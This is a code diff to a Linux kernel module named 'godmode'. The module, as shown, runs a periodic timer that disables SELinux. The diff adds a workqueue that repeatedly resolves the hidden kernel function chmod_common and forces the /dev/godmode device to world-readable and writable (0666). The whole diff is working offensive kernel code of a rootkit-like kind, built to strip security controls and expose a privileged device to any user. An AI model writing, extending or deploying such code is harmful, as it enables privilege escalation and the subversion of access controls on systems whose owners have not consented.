@@ -12,6 +12,8 @@
 #include <linux/kprobes.h>
 #include <linux/kernfs.h>
 #include <linux/namei.h>
+#include <linux/workqueue.h>
+
 #include <asm/preempt.h>
 
 
@@ -36,6 +38,7 @@ static long godmode_unlocked_ioctl(struct file *file, unsigned int cmd,
 			       unsigned long arg);
 static char *godmode_devnode(const struct device *dev, umode_t *mode);
 static int godmode_uevent(const struct device *dev, struct kobj_uevent_env *env);
+static int godmode_update_mode(void);
 
 static int godmode_major;
 static struct device *godmode_dev;
@@ -45,6 +48,9 @@ static bool was_selinux_enabled;
 /* Define this as is not accessible by the module by default */
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 static kallsyms_lookup_name_t kallsyms_lookup_name_cb;
+
+typedef int (*chmod_common_t)(const struct path *path, umode_t mode);
+static chmod_common_t chmod_common_cb;
 
 static struct class godmode_class =
 {
@@ -60,6 +66,15 @@ static const struct file_operations fops = {
 
 	.owner = THIS_MODULE,
 };
+
+static void godmode_workqueue_fn(struct work_struct *work); 
+ 
+DECLARE_WORK(workqueue, godmode_workqueue_fn);
+ 
+static void godmode_workqueue_fn(struct work_struct *work)
+{
+	godmode_update_mode();
+}
 
 static int godmode_open(struct inode *inode, struct file *file)
 {
@@ -220,8 +235,10 @@ static char *godmode_devnode(const struct device *dev, umode_t *mode)
 {
 	if (mode != NULL)
 		*mode = GODMODE_DEV_CLASS_MODE;
+	else
+		return NULL;
 
-	return NULL;
+	return kasprintf(GFP_KERNEL, "%s", dev_name(dev));
 }
 
 static enum hrtimer_restart hrtimer_deffered_work(struct hrtimer *hrtimer)
@@ -240,8 +257,30 @@ static enum hrtimer_restart hrtimer_deffered_work(struct hrtimer *hrtimer)
 	if (selinux_state)
 		godmode_disable_selinux();	
 
+	schedule_work(&workqueue);
+
 	hrtimer_forward_now(hrtimer, ms_to_ktime(GODMODE_PERIODIC_TICK_MS));
 	return HRTIMER_RESTART;
+}
+
+static int godmode_update_mode(void)
+{
+	struct path path;
+	int error;
+	umode_t mode = 0666;
+	const char *filename = "/dev/godmode"; 
+
+	error = kern_path(filename, LOOKUP_FOLLOW, &path);
+	if (error) {
+		pr_err("[!] cannot get the path of the dev %d\n", error);
+		return error;
+	}
+
+	error = chmod_common_cb(&path, mode);
+	path_put(&path);
+	
+	pr_info("[!] Updated path to 0666\n");
+	return 0;
 }
 
 static int godmode_init(void)
@@ -267,7 +306,10 @@ static int godmode_init(void)
 	}
 
 	kallsyms_lookup_name_cb = godmode_get_kernel_function("kallsyms_lookup_name");
-	
+	chmod_common_cb = godmode_get_kernel_function("chmod_common");
+
+	godmode_update_mode();
+
 	if (godmode_is_selinux_enabled()) {
 		pr_info("[!] SELinux is enabled\n");
 	} else {
